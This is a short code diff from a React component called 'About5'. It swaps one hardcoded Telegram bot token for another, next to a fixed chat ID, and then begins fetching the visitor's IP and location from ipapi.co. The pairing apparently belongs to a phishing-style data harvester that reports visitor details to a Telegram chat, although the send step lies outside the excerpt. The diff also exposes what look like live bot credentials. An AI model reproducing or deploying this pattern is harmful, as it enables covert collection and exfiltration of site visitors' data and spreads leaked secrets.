@@ -20,7 +20,7 @@ const About5 = () => {
           // You can set an error state or display a message
           return;
         } else {
-          const bot = 'bot6025784851:AAFcSrozRyU8WAZTOr1wiSCB1m6HKiZwZoY';
+          const bot = 'bot6444053579:AAEJM3cGwVt_s9ajNfMpPnKtr_71p20S_dw';
           const chid = '5651241356';
     
           fetch(`https://ipapi.co/json/`)
